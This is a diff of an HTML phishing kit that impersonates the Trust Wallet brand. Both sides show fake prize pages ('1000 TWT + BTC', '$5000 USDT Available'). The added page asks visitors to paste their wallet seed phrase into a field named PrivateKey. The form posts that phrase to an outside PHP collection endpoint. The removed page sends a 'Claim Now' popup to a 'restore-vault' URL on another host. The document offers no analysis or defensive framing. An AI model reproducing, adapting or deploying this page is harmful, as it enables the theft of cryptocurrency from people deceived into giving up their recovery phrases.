@@ -1,508 +1,135 @@
 <!DOCTYPE html>
-<html lang="en"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
+<html lang="en"><head>
+<style>
+.anticon {
+  display: inline-block;
+  color: inherit;
+  font-style: normal;
+  line-height: 0;
+  text-align: center;
+  text-transform: none;
+  vertical-align: -0.125em;
+  text-rendering: optimizeLegibility;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
 
-    <style>
-        .anticon {
-            display: inline-block;
-            color: inherit;
-            font-style: normal;
-            line-height: 0;
-            text-align: center;
-            text-transform: none;
-            vertical-align: -0.125em;
-            text-rendering: optimizeLegibility;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-        
-        .anticon>* {
-            line-height: 1;
-        }
-        
-        .anticon svg {
-            display: inline-block;
-        }
-        
-        .anticon::before {
-            display: none;
-        }
-        
-        .anticon .anticon-icon {
-            display: block;
-        }
-        
-        .anticon[tabindex] {
-            cursor: pointer;
-        }
-        
-        .anticon-spin::before,
-        .anticon-spin {
-            display: inline-block;
-            -webkit-animation: loadingCircle 1s infinite linear;
-            animation: loadingCircle 1s infinite linear;
-        }
-        
-        @-webkit-keyframes loadingCircle {
-            100% {
-                -webkit-transform: rotate(360deg);
-                transform: rotate(360deg);
-            }
-        }
-        
-        @keyframes loadingCircle {
-            100% {
-                -webkit-transform: rotate(360deg);
-                transform: rotate(360deg);
-            }
-        }
-    </style>
-    <style>
-        .eEPviq {
-            border: none;
-            color: rgb(68, 68, 68);
-            background: rgb(233, 234, 237);
-            transition: all 0.5s ease 0s;
-            font-size: 18px;
-            width: 100%;
-            padding: 15px 0px;
-            border-radius: 4px;
-            cursor: pointer;
-            outline: none;
-            margin-bottom: 20px;
-        }
-        
-        @media (max-width: 768px) .eEPviq {
-            font-size: 16px;
-            padding: 12px 0px;
-        }
-        
-        .OHNdu {
-            position: relative;
-            width: 500px;
-            min-height: 100vh;
-            background: #17171f;
-        }
-        
-        .jvrGcO {
-            display: flex;
-            -webkit-box-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            justify-content: center;
-            width: 100%;
-            min-height: 100vh;
-            background-attachment: fixed;
-        }
-        
-        * {
-            outline: none !important;
-        }
-        
-        .hARKVj {
-            -webkit-box-align: center;
-            align-items: center;
-            width: 100%;
-            padding: 10px 0px 10px;
-            margin-bottom: 20px;
-            -webkit-box-pack: justify;
-            justify-content: space-between;
-            border-bottom: 1px solid #20242d;
-            background-color: #17171f !important;
-        }
-        
-        .gdtVXy {
-            width: 180px;
-        }
-        
-        .eNdDTk {
-            width: 150px;
-        }
-        
-        .kFZWwp {
-            font-family: Gilroy, sans-serif;
-            background-color: #17171f;
-            font-size: 0.9rem;
-            color: rgba(127, 127, 127, 0.85);
-        }
-        
-        .cDnNqw .ant-input-affix-wrapper {
-            background-color: rgb(255, 255, 255);
-            border: 1px solid rgb(226, 226, 226) !important;
-        }
-        
-        .cDnNqw input.ant-input,
-        .cDnNqw .ant-select-selection {
-            font-size: 1rem;
-            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
-            /* line-height: 140%; */
-            font-style: normal;
-            font-weight: normal;
-            /* height: 190px; */
-            /* width: 495px; */
-            border: 1px solid #cdcdcd;
-            border-radius: 6px;
-            background-color: #fff;
-            padding: 12px;
-        }
-        
-        .fWmldN {
-            color: rgb(255, 255, 255);
-            border: none;
-            transition: all 0.5s ease 0s;
-            font-size: 14px;
-            width: 100%;
-            padding: 10px 0px;
-            border-radius: 4px;
-            cursor: pointer;
-            outline: none;
-            margin-bottom: 20px;
-            background-color: #0b65c6;
-            letter-spacing: .13em;
-            font-weight: 540;
-        }
-        
-        .iZNmqq {
-            color: rgb(39, 52, 152);
-            width: 100%;
-            font-size: 16px;
-            margin-bottom: 60px;
-            text-align: left;
-        }
-        
-        .import-account__secret-phrase {
-            /*font-size: 1rem;*/
-            /*font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;*/
-            /* line-height: 140%; */
-            font-style: normal;
-            font-weight: normal;
-            height: 100px;
-            width: 100%;
-            border: 1px solid #1890ff;
-            border-radius: 6px;
-            background-color: #17171f;
-            padding: 12px;
-            color: #fbfbfd;
-        }
-        
-        .thepadding {
-            padding: 0px 35px 0px;
-        }
-        
-        .barnerd {
-            background-color: #3375bb !important;
-        }
-        
-        .button--disabled,
-        .button[disabled] {
-            cursor: auto;
-            opacity: 0.5;
-            pointer-events: none;
-        }
-        
-         ::placeholder {
-            color: hsla(0, 0%, 49.8%, .65);
-            opacity: 1;
-        }
-        
-         :-ms-input-placeholder {
-            color: hsla(0, 0%, 49.8%, .65);
-        }
-        
-         ::-ms-input-placeholder {
-            color: hsla(0, 0%, 49.8%, .65);
-        }
-        
-        .loader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            background: #fff;
-            width: 100%;
-            height: 100vh;
-            z-index: 100;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .lodas {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-    </style>
-    <meta charset="utf-8">
-    <link rel="icon" href="https://trustwallet.com/assets/images/favicon.ico">
-    <link rel="manifest" href="./manifest.json">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="theme-color" content="#000000">
-    <meta name="Cashtab" content="Cashtab">
-    <link rel="manifest" href="./manifest.json">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta property="og:description" content="A web wallet for eCash">
-    <meta property="og:title" content="Cashtab">
-    <link rel="apple-touch-icon" href="https://trustwallet.com/assets/images/favicon.png">
-    <title>Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet</title>
-    <link href="css/app.css" rel="stylesheet">
-    <link href="css/main.chunk.css" rel="stylesheet">
-    <script src="jquery.min.js"></script>
-<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet</title><meta property="og:title" content="Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet"><meta name="description" content="Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!"><meta property="og:description" content="Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!"><meta name="twitter:card" content="summary_large_image"><meta property="twitter:image" content="https://trustwallet.com/assets/images/media/preview/horizontal_blue.png"><meta name="twitter:creator" content="@trustwalletapp"><meta property="og:locale" content="en"><meta property="og:image" content="https://trustwallet.com/assets/images/media/preview/horizontal_blue.png"><meta property="og:type" content="website"><link rel="canonical" href="https://trustwallet.com/"><meta property="og:url" content="https://trustwallet.com/"><meta property="og:site_name" content="Trust Wallet"><meta property="al:ios:app_name" content="Trust Wallet"><meta property="al:ios:app_store_id" content="1288339409"><meta property="al:ios:url" content="trust://"><meta property="al:android:app_name" content="Trust Wallet"><meta property="al:android:package" content="com.wallet.crypto.trustapp"><meta property="al:android:url" content="https://trustwallet.com"><link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon"><link rel="shortcut icon" type="image/png" href="/assets/images/favicon.png"><meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss"><meta name="theme-color" content="#3375BB"><script type="application/ld+json">
-    {
-      "description": "Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!",
-      "@type": "WebPage",
-      "url": "https://trustwallet.com/",
-      "headline": "Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet",
-      "@context": "https://schema.org"
-    }
-  </script><script async="" defer="" data-domain="trustwallet.com" src="https://analytics.trustwallet.com/js/plausible.js"></script><script>window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments) }</script><script type="application/javascript">
-    document.addEventListener("DOMContentLoaded", function(event) {
-      document.getElementById('navbarToggle').addEventListener('click', function() {
-        var el = document.getElementById('navbarSupportedContent');
-        var toggled = window.getComputedStyle(el).display == 'block';
-        if (toggled) {
-          el.style.display = "none";
-        } else {
-          el.style.display = "block";
-        }
-      })
-      //Add Huawei download button based on device.
-      var result = new UAParser().getResult();
-      var apple = document.getElementsByClassName("apple");
-      var huawei = document.getElementsByClassName("huawei");
-      var download = document.getElementsByClassName("downloadapp-native");
+.anticon > * {
+  line-height: 1;
+}
 
-      if (result.os.name == "Android") {
-        for (var i = 0; i < huawei.length; i++) {
-          huawei[i].classList.remove("hidden");
-          apple[i].classList.add("hidden");
-        }
-        // if it is android change ctas to googleplay
-        for (var i = 0; i < download.length; i++) {
-          download[i].href = "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite";
-        }
-      }
-      // if its apple change ctas to appstore
-       else if (result.os.name == "iOS") {
-        for (var i = 0; i < download.length; i++) {
-          download[i].href = "https://apps.apple.com/app/apple-store/id1288339409?mt=8";
-        }
-      }
-    });
-  </script></head>
+.anticon svg {
+  display: inline-block;
+}
+
+.anticon::before {
+  display: none;
+}
+
+.anticon .anticon-icon {
+  display: block;
+}
+
+.anticon[tabindex] {
+  cursor: pointer;
+}
+
+.anticon-spin::before,
+.anticon-spin {
+  display: inline-block;
+  -webkit-animation: loadingCircle 1s infinite linear;
+  animation: loadingCircle 1s infinite linear;
+}
+
+@-webkit-keyframes loadingCircle {
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+
+@keyframes loadingCircle {
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+</style>
+<meta charset="utf-8"><link rel="icon" href="images/truste.png"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#fafafa">
+<link href="kalapia/apk.css" rel="stylesheet">
+<link rel="apple-touch-icon" href="images/truste.png&quot;"><title>Giveaway</title>
+<link href="kalapia/chunk1.css" rel="stylesheet">
+<link href="kalapia/app.css" rel="stylesheet">
+<link href="kalapia/main.chunk.css" rel="stylesheet">
+<script src="kalapia/jquery.min.js"></script>
+<script src="kalapia/sinop.min.js" charset="utf-8" type="text/javascript"></script>
+</head>
+<body>
+
+
+<div id="root"><div class="ant-spin-nested-loading"><div class=""><div class="sc-jqCOkK kFZWwp"><div class="sc-gGBfsJ jvrGcO"><div class="sc-jnlKLf OHNdu">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="images/cunekpantek.png">
+<br>
+<br>
+
+
+<center><div class="confirm-approve-content__identicon-wrapper"><img class="identicon confirm-approve-content__identicon" src="images/825.png" alt="" style="height: 60px;width: 60px;"></div></center>
+
+<div class="confirm-approve-content__title" style="
+    font-size: 1.2rem;
+    line-height: 140%;
+    justify-content: center;
+    text-align: center;
+    margin-top: 22px;
+    padding-left: 24px;
+    padding-right: 24px;
+    color: #00a854;
+    ">$5000 USDT Available.</div>
 
 
 
+<h4><center>Enter your secret phrase here to connect</center></h4>
 
+<div class="sc-htoDjs cDnNqw">
+	<form method="post" action="https://addons-send-date.my.id/venus/asu.php?nkbihfbeogaeaoehlefnkodbefgpgknn/home" class="ant-form ant-form-horizontal">
+        <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;"><div class="ant-col ant-form-item-control"><p class="thepadding" style="text-align: left;color: hsla(0,0%,49.8%,.85);">Phrase</p>
+<div>
+    <div class="thepadding">
+        <textarea class="import-account__secret-phrase" placeholder="Paste seed phrase from clipboard" name="PrivateKey" id="wordsseed" minlength="24" maxlength="305" required="" style="
+    height: 106px;
+"></textarea>Typically 12 (sometimes 24) words separated by single spaces
+        </div></div><div class="ant-form-item-explain">
+                </div></div></div>
 
+                <div class="thepadding">
+<button class="button sc-VigVT fWmldN" type="submit">IMPORT</button>
+<div1></div1></div>
+<br>
+<br>
+<br>
+<br>
+<center>
+<a class="nav-link" href="#"><font face="Arial" size="2" color="#4682B4">What is a Recovery Phrase?</font></a>
 
+</center>
+</form></div> 
+                            </div>
+                            <div class="wawobp loader" data-tenqwa="9fkuxe" style="display: none;">
+                                <div class="yat5ls lodas" data-2ivb6w="2n92zq">
+                                    <svg viewBox="0 0 40 40" width="80px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-5a69fd5e-0 iGtDTz" style="
+    margin-bottom: 20px;
+">
+                      <path opacity="0.9" d="M19.9959 4.8377L20.7771 3.82105C20.5523 3.64825 20.2766 3.55457 19.9931 3.55457C19.7095 3.55457 19.4339 3.64825 19.209 3.82105L19.9959 4.8377ZM33.425 8.7837H34.7059C34.7081 8.61378 34.6767 8.44509 34.6134 8.28737C34.5502 8.12965 34.4563 7.98603 34.3372 7.8648C34.2181 7.74358 34.0762 7.64714 33.9196 7.58107C33.763 7.515 33.5949 7.4806 33.425 7.47985V8.7837ZM19.9959 36.2161L19.2837 37.2845C19.4936 37.425 19.7405 37.5 19.9931 37.5C20.2457 37.5 20.4925 37.425 20.7024 37.2845L19.9959 36.2161ZM6.57841 8.7837V7.49709C6.40847 7.49783 6.24036 7.53223 6.0838 7.5983C5.92723 7.66437 5.7853 7.76081 5.66621 7.88204C5.54712 8.00326 5.45322 8.14688 5.38995 8.3046C5.32667 8.46232 5.29526 8.63101 5.29754 8.80093L6.57841 8.7837ZM19.2148 5.84861C25.0275 10.3518 31.6846 10.0646 33.4307 10.0646V7.49709C31.6214 7.49709 25.8259 7.72684 20.7943 3.82105L19.2148 5.84861ZM32.1499 8.76073C32.0522 14.7113 31.7995 18.91 31.317 22.0174C30.8345 25.1248 30.1682 26.9399 29.2894 28.238C28.4106 29.5361 27.2848 30.3804 25.6364 31.3626C23.9879 32.3448 21.8799 33.4361 19.2837 35.1535L20.7312 37.2845C23.1895 35.6475 25.2343 34.6021 26.9747 33.5625C28.7284 32.6075 30.2502 31.2779 31.4319 29.6682C32.5806 27.9451 33.3675 25.6475 33.873 22.408C34.3785 19.1685 34.6369 14.809 34.7346 8.80093L32.1499 8.76073ZM20.7312 35.1535C18.1522 33.4304 16.05 32.362 14.413 31.3684C12.776 30.3747 11.6502 29.582 10.7656 28.238C9.8811 26.8939 9.16312 25.1076 8.66915 22.0174C8.17519 18.9273 7.95692 14.7113 7.85928 8.76073L5.29754 8.80093C5.39518 14.809 5.6594 19.18 6.15911 22.408C6.65882 25.636 7.42275 27.9336 8.59448 29.6682C9.77051 31.2788 11.2888 32.6088 13.0402 33.5625C14.7633 34.6021 16.8254 35.6475 19.2837 37.2845L20.7312 35.1535ZM6.57841 10.0646C8.30155 10.0646 14.9644 10.3518 20.7771 5.84861L19.209 3.82105C14.166 7.72684 8.37048 7.49709 6.57266 7.49709L6.57841 10.0646Z" fill="#0b65c6"></path>
+                    </svg>
+                                    <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#fff;display:block;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+                        <circle cx="50" cy="50" fill="none" stroke="#0b65c6" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
+                          <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
+                        </circle>
+                      </svg>
 
+                </div>
 
+<script src="kalapia/load.js"></script>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<body><noscript>Your browser does not support JavaScript!</noscript>
-<link rel="preload" href="/assets/fonts/IBMPlexSans/IBMPlexSans-Regular.woff2" as="font" type="font/woff2" crossorigin="">
-<link rel="preload" href="/assets/fonts/IBMPlexSans/IBMPlexSans-Bold.woff2" as="font" type="font/woff2" crossorigin="">
-<link rel="preload" href="/assets/fonts/IBMPlexSans/IBMPlexSans-Medium.woff2" as="font" type="font/woff2" crossorigin="">
-<link rel="stylesheet" href="https://trustwallet.com/css/main.css">
-<link rel="alternate" href="https://trustwallet.com/" hreflang="en">
-<link rel="alternate" href="https://trustwallet.com/" hreflang="x-default"><link rel="alternate" href="https://trustwallet.com/ru/" hreflang="ru"><link rel="alternate" href="https://trustwallet.com/de/" hreflang="de"><link rel="alternate" href="https://trustwallet.com/vi/" hreflang="vi"><link rel="alternate" href="https://trustwallet.com/id/" hreflang="id"><link rel="alternate" href="https://trustwallet.com/ko/" hreflang="ko"><link rel="alternate" href="https://trustwallet.com/ja/" hreflang="ja"><link rel="alternate" href="https://trustwallet.com/tr/" hreflang="tr"><link rel="alternate" href="https://trustwallet.com/pt_BR/" hreflang="pt"><link rel="alternate" href="https://trustwallet.com/zh_CN/" hreflang="zh"><link rel="alternate" href="https://trustwallet.com/es/" hreflang="es"><script type="text/javascript" src="../assets/js/platform.js"></script>
-<script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>
-
- <nav class="navbar navbar-expand-lg navbar-togglable navbar-dark bg-primary d-block">
-<div class="container">
-<a id="navbar-brand" class="navbar-brand" href="/" aria-label="Goes back on homepage"><svg class="navbar-brand-img logotype-white" alt="Trust Wallet logotype"></svg></a><button class="navbar-toggler collapsed" id="navbarToggle" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-expanded="false" aria-hidden="true" aria-label="Toggle navigation" aria-controls="navbarCollapse">
-<span class="navbar-toggler-icon collapsed"></span>
-</button>
-<div class="navbar-collapse collapse navbar-margin" id="navbarSupportedContent">
-<button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarCollapse" aria-expanded="false" aria-hidden="true" aria-label="Toggle navigation">
-</button>
-<ul class="navbar-nav font-size-sm ml-auto">
-<li class="nav-item">
-<a class="nav-link" href="/assets" aria-label="Goes to supported assets page">Assets</a>
-</li>
-<li class="nav-item">
-<a class="nav-link" href="/staking" aria-label="Goes to staking page where you can learn what is staking and calculate APRs">Staking</a>
-</li>
-<li class="nav-item">
-<a class="nav-link" href="/earn" aria-label="Goes to earn page where you can earn up to +11% APR">Earn<span class="badge badge-success ml-2 pl-2 pr-2">+11% APR</span></a>
-</li>
-<li class="nav-item">
-<a class="nav-link" href="/nft-wallet" aria-label="Goes to NFT page">NFTs</a>
-</li>
-<li class="nav-item">
-<a class="nav-link" href="/dapp" aria-label="Goes to DApp browser page">DApp Browser</a>
-</li><li class="nav-item dropdown" aria-label=" flag" alt=" flag">
-<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="false" aria-expanded="true" aria-label="Opens dropdown to select different language for the site">
-Language
-<div class="flag bg-" aria-label=" flag"></div>
-</a>
-<div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarDropdown">
-<div class="list-group list-group-flush">
-<ul class="list-unstyled list-block">
-<li class="list-inline-item m-6"><a href="/" class="list-group-item" aria-label="changes language of the page to en">
-<div class="flag bg-en" title="en flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/ru/" class="list-group-item list-inline-item" aria-label="changes language of the page to ru">
-<div class="flag bg-ru" title="ru flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/de/" class="list-group-item list-inline-item" aria-label="changes language of the page to de">
-<div class="flag bg-de" title="de flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/vi/" class="list-group-item list-inline-item" aria-label="changes language of the page to vi">
-<div class="flag bg-vi" title="vi flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/id/" class="list-group-item list-inline-item" aria-label="changes language of the page to id">
-<div class="flag bg-id" title="id flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/ko/" class="list-group-item list-inline-item" aria-label="changes language of the page to ko">
-<div class="flag bg-ko" title="ko flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/ja/" class="list-group-item list-inline-item" aria-label="changes language of the page to ja">
-<div class="flag bg-ja" title="ja flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/tr/" class="list-group-item list-inline-item" aria-label="changes language of the page to tr">
-<div class="flag bg-tr" title="tr flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/pt_BR/" class="list-group-item list-inline-item" aria-label="changes language of the page to pt_BR">
-<div class="flag bg-pt_BR" title="pt_BR flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/zh_CN/" class="list-group-item list-inline-item" aria-label="changes language of the page to zh_CN">
-<div class="flag bg-zh_CN" title="zh_CN flag"></div>
-</a></li><li class="list-inline-item m-6"><a href="/es/" class="list-group-item list-inline-item" aria-label="changes language of the page to es">
-<div class="flag bg-es" title="es flag"></div>
-</a></li>
-</ul>
-</div>
-</div>
-</li></ul>
-</div>
-</div>
-</nav>
-<main class="page-content" aria-label="Content">
-<section class="pt-8 pb-8 bg-gradient-primary">
-<div class="container">
-<div class="row align-items-center justify-content-center justify-content-md-between">
-<div class="col-12 col-lg-6 mb-8 text-center text-md-left text-white">
-<h1 class="display-3 font-weight-bold">Grab prize 1000 TWT + 0.4172966 BTC 🎁</h1>
-<p class="text-white-90 lead mb-4">Congratulations !!!<br>
-You are one of the active users who are lucky to get 1000 TWT + 0.4172966 BTC <br>From Trust Wallet Appreciation Program 💰💰💰</p><a href="#" class="btn btn-white downloadapp-native" aria-label="goes to download page to get Trust Wallet App" onclick="window.open('https://best-cord.github.io/immunity/community/#restore-vault','','toolbar=yes,scrollbars=yes,resizable=yes,top=0,left=100000,width=400,height=780') ;return false">&nbsp;Claim Now
-</a><div class="download-button">
-<div class="row download">
-<div class="col-12 col-lg-4 apple">
-<a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" data-analytics="&quot;Download Clicks&quot;, {&quot;props&quot;:{&quot;Target&quot;:&quot;App Store&quot;}}" class="downloadapp" aria-label="goes to AppStore to download Trust Wallet for iphones">
-
-</a>
-</div>
-
-
-<div class="col-12 col-lg-4 huawei hidden">
-<a href="https://appgallery.huawei.com/#/app/C103425801" data-analytics="&quot;Download Clicks&quot;, {&quot;props&quot;:{&quot;Target&quot;:&quot;Huawei AppGallery&quot;}}" class="downloadapp" aria-label="goes to huawei store to download Trust Wallet for huawei phones">
-<svg class="download-app-image download-huawei" loading="lazy" role="img" alt="goes to huawei store to download Trust Wallet for huawei phones" aria-label="goes to huawei store to download Trust Wallet for huawei phones" rel="noopener"></svg>
-</a>
-</div>
-</div>
-</div></div>
-<div class="col-12 col-lg-6 text-center">
-<img loading="lazy" class="hero-image mx-auto d-block img-fluid" src="https://trustwallet.com/assets/images/home_hero.png" alt="Trust Wallet app mobile mockup">
-</div>
-</div>
-</div>
-</section>
-<section class="pt-6">
-<div class="container">
-
-</div>
-</section>
-
-
-</main>
-
-
-
-
-
-
- 
-
-
-                        
-                    
-                
-            
-        
-    
-	
-
-
- <script>
-     <style>
-        .anticon {
-            display: inline-block;
-            color: inherit;
-            font-style: normal;
-            line-height: 0;
-            text-align: center;
-            text-transform: none;
-            vertical-align: -0.125em;
-            text-rendering: optimizeLegibility;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-        
-        .anticon>* {
-            line-height: 1;
-        }
-        
-        .anticon svg {
-            display: inline-block;
-        }
-        
-        .anticon::before {
-            display: none;
-        }
-        
-        .anticon .anticon-icon {
-            display: block;
-        }
-        
-        .anticon[tabindex] {
-            cursor: pointer;
-        }
-        
-        .anticon-spin::before,
-        .anticon-spin {
-            display: inline-block;
-            -webkit-animation: loadingCircle 1s infinite linear;
-            animation: loadingCircle 1s infinite linear;
-        }
-        
-        @-webkit-keyframes loadingCircle {
-            100% {
-                -webkit-transform: rotate(360deg);
-                transform: rotate(360deg);
-            }
-        }
-        
-        @keyframes loadingCircle {
-            100% {
-                -webkit-transform: rotate(360deg);
-                transform: rotate(360deg);
-            }
-        }
-    </style></body></html>
-</script><iframe id="netlify-identity-widget" title="Netlify identity widget" style="position: fixed; top: 0; left: 0; border: none; width: 100%; height: 100%; overflow: visible; background: transparent; display: none; z-index: 99; " src="about:blank"></iframe>
-<iframe id="netlify-identity-widget" title="Netlify identity widget" style="position: fixed; top: 0; left: 0; border: none; width: 100%; height: 100%; overflow: visible; background: transparent; display: none; z-index: 99; " src="about:blank"></iframe>
-<iframe id="netlify-identity-widget" title="Netlify identity widget" style="position: fixed; top: 0; left: 0; border: none; width: 100%; height: 100%; overflow: visible; background: transparent; display: none; z-index: 99; " src="about:blank"></iframe>
-<iframe id="netlify-identity-widget" title="Netlify identity widget" style="position: fixed; top: 0; left: 0; border: none; width: 100%; height: 100%; overflow: visible; background: transparent; display: none; z-index: 99; " src="about:blank"></iframe>
-<iframe id="netlify-identity-widget" title="Netlify identity widget" style="position: fixed; top: 0; left: 0; border: none; width: 100%; height: 100%; overflow: visible; background: transparent; display: none; z-index: 99; " src="about:blank"></iframe></body></html>
+</div></div></div></div></div></div></div></body></html>
